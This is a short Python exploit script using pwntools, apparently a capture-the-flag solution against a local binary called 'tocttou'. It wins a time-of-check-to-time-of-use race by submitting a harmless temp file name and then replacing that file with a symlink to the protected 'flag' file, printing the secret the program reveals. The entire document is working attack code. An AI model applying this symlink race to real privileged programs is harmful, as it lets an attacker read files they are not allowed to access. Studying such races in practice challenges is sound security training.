from pwn import *
import os

binary = ELF('./tocttou')
comm = process(binary.path)

# create temp file, will be removed
os.mknod('myflag')

# symlink flag to temp replace temp file
comm.sendline(b'myflag')
os.system('ln -sf flag myflag')

# print flag
comm.recvuntil(b'!!\n')
print(comm.recvuntil(b'}'))
os.remove('myflag')
